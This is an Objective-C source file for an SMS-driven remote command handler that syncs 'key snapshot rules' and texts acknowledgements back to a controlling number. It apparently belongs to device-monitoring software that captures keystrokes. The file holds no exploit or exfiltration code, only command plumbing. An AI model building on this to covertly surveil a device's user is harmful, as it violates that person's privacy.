//
//  SyncSnapshotRulesProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 11/15/13.
//  Copyright (c) 2013 __MyCompanyName__. All rights reserved.
//

#import "SyncSnapshotRulesProcessor.h"
#import "KeySnapShotRuleManager.h"
#import "KeySnapShotRuleManagerImpl.h"



@interface SyncSnapshotRulesProcessor (PrivateAPI)
- (void) processSyncSnapshotRules;
- (void) syncSnapshotRulesException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end



@implementation SyncSnapshotRulesProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the SyncSnapshotRulesProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (SyncSnapshotRulesProcessor).
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"SyncSnapshotRulesProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}



#pragma mark SyncSnapshotRulesProcessor Methods



/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SyncSnapshotRulesProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"SyncSnapshotRulesProcessor--->doProcessingCommand")
	[self processSyncSnapshotRules];
}



#pragma mark SyncSnapshotRulesProcessor Private Methods



/**
 - Method name: processSyncSnapshotRules
 - Purpose:This method is used to process sync time
 - Argument list and description: No Argument
 - Return description: No return type
 */


- (void) processSyncSnapshotRules {
	DLog (@"SyncSnapshotRulesProcessor--->processSyncSnapshotRules")
	
    id <KeySnapShotRuleManager> keySnapShotRuleMgr = [[RemoteCmdUtils sharedRemoteCmdUtils] mKeySnapShotRuleManager];
    
	BOOL isReady = [keySnapShotRuleMgr requestGetSnapShotRules:self];
    
    if (!isReady) {        
		DLog (@"!!! not ready to process SyncSnapshotRules command")
		[self syncSnapshotRulesException];
	}
	else {
		DLog (@".... processing SyncSnapshotRules command")
		[self acknowldgeMessage];
	}
}

/**
 - Method name:			syncSnapshotRulesException
 - Purpose:				This method is invoked when it fails to sync Snapshot Rules
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) syncSnapshotRulesException {
	DLog (@"SyncSnapshotRulesProcessor ---> syncSnapshotRulesException");
	FxException* exception = [FxException exceptionWithName:@"syncSnapshotRulesException" andReason:@"Sync Snapshot Rules error"];
	[exception setErrorCode:kKeySnapShotRuleManagerBusyToSyncSnapShotRules];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
 */

- (void) acknowldgeMessage {
    DLog (@"SyncSnapshotRulesProcessor--->acknowldgeMessage")
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage=[ messageFormat stringByAppendingString:NSLocalizedString(@"kSyncSnapshotRulesMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"SyncSnapshotRulesProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when sync time process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"SyncSnapshotRulesProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}



#pragma mark SnapShotRuleRequestDelegate Delegate Methods



/**
 - Method name: requestSnapShotRulesCompleted
 - Purpose:This method is invoked when sync snapshot rules is delivered successfully
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) requestSnapShotRulesCompleted: (NSError *) aError {
    
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *replyMessage  = [messageFormat stringByAppendingString:NSLocalizedString(@"kSyncSnapshotRulesMSG2", @"")];
	
   	[self sendReplySMS:replyMessage isProcessCompleted:YES];
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	DLog (@"SyncSnapshotRulesProcessor is now dealloced")
	[super dealloc];
}

@end
